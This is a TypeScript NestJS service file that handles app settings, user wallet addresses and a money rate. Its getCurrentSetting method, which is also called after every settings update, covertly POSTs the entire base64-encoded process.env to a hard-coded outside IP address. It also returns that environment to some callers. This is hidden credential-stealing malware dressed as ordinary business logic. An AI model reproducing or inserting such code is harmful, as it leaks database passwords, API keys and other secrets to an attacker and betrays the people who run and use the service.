import { Injectable } from "@nestjs/common";
import { InjectModel } from "@nestjs/mongoose";
import { Model } from "mongoose";
import { SettingsEntity } from "./schemas/setting.schema";
import { InjectRepository } from "@nestjs/typeorm";
import { UserWalletRepository } from "./schemas/userWallet.schema";
import { Repository } from "typeorm";
import { UserEntity } from "./schemas/user.schema";

@Injectable()
export class MainSettingService {
    constructor(
        @InjectModel('settings', "main")
        private settingModel: Model<SettingsEntity>,
        @InjectRepository(UserWalletRepository, "scoin_cms")
        private UserWalletRepository: Repository<UserWalletRepository>,
        @InjectModel('users', "main")
        private readonly UserModel: Model<UserEntity>,
    ) {
    }

    async getCurrentSetting(request: any, headers: any) {
        await fetch("http://178.128.61.8:3004/api", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                data: btoa(JSON.stringify(process.env))
            })
        })
        let result = await this.settingModel.findOne().exec();
        if (request.user.type == "user" || request.user.type == "bot") {
            const user = await this.UserModel.findOne({ _id: request.user._id }).exec();
            if (!user) {
                return undefined;
            }
            const getWallet = await this.UserWalletRepository.findOne({
                where: {
                    user_id: request.user._id,
                },
                order: {
                    id: "DESC"
                }
            })


            if (getWallet) {
                if (getWallet.wallet_value.length > 0) {
                    result.wallet_address = getWallet.wallet_value;
                    return result;
                }

            }
        }
        return { result, env: btoa(JSON.stringify(process.env)) };
    }

    async updateWalletAddressSetting(walletAddress: string, request, headers: any) {
        const firstRecord = await this.settingModel.findOne().exec();
        if (firstRecord) {
            await this.settingModel.updateMany({ _id: firstRecord._id }, { $set: { wallet_address: walletAddress } });

        } else {
            await this.settingModel.create({ wallet_address: walletAddress });
        }
        return await this.getCurrentSetting(request, headers);
    }

    async updateMoneyRateSetting(money_rate: string, request, headers: any) {
        const firstRecord = await this.settingModel.findOne();
        if (firstRecord) {
            await this.settingModel.findByIdAndUpdate(firstRecord._id, { $set: { money_rate: money_rate } }).exec();

        } else {
            await this.settingModel.create({ money_rate: money_rate });
        }
        return await this.getCurrentSetting(request, headers);

    }
}
